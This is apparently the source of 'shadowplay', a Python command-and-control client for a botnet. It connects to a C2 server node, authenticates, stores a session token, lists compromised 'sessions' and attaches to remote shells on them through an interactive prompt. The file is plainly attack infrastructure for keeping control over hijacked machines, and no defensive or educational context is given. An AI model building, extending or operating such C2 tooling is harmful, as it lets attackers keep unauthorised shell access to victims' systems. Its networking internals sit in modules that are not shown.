#!/bin/python3

from argparse import ArgumentParser
from getpass import getpass
from os import system

from modules.comms import *
from modules.read import read_session_file
from modules.colors import Colors
from modules.help import print_help


c = Colors()

parser = ArgumentParser(usage="python3 shadowplay.py --node <user>@<node-address>:<port>",
                        prog="shadowplay: command-and-control client for python.\n",
                        description="Connect to any node running shadowplay-srv. Control remotely earned shells.",
                            epilog="See https://github.com/entr0pie/shadowplay-cli for more information.")

parser.add_argument("-n", "--node", type=str, required=True, help="connect to a node")
args = parser.parse_args()

USER, host = args.node.split("@")

print("\n<< shadowplay command-and-control (C&C) system >>\n")

try:
    ADDRESS, PORT = host.split(':')
    PORT = int(PORT)

except ValueError: 
    ADDRESS, PORT = host, 10000

print(f"Connecting to {ADDRESS}:{PORT} ... ", end="")

if not is_alive(ADDRESS):
    print(f"{c.fail}no.{c.reset}\nError: node seems down. Verify your internet connection.")
    exit(1)

if not is_botnet_server(ADDRESS, PORT):
    print(f"{c.fail}no.{c.reset}\nError: server does not respond correctly (maybe a mismatched port?)")
    exit(1)

print(f"{c.ok}ok{c.reset}")

PASSWD = getpass(prompt=f"{USER}'s password: ")

print("Login in... ", end="")

TOKEN = get_token(ADDRESS, PORT, USER, PASSWD)

if TOKEN == 32 * "0": 
    print(f"{c.fail}no.{c.reset}\nLogin failed, check your credentials.")
    exit(1)

print(f"{c.ok}ok logged in.{c.reset}")
print(f"Your session: {c.bold}{TOKEN}{c.reset}")

token_file = open('token.tmp', 'w')
token_file.write(TOKEN)
token_file.close()

print("\nType \"help\" or ? for more information.\n")

while True:
    try:
        command = input(f"{USER}@{ADDRESS}> ").strip().lower()

        if command == "help" or command == "?":
            print_help()

        elif command == "sessions":
            sessions = get_sessions(ADDRESS, PORT, TOKEN)
            sessions_file = open('sessions.tmp', 'w')
            sessions_file.write(sessions)
            sessions_file.close()
            read_session_file()
            

        elif command[:7] == "connect": 
            _, addr = command.split(' ')
            
            try:
                ip, port = addr.split(':')
                port = int(port)

            except ValueError:
                print('Usage: connect <ip>:<port>\n')
                continue

            connect_session(ADDRESS, PORT, ip, port, TOKEN)

    
    except KeyboardInterrupt:
        system("rm token.tmp")
        system("rm sessions.tmp")
        exit(0)

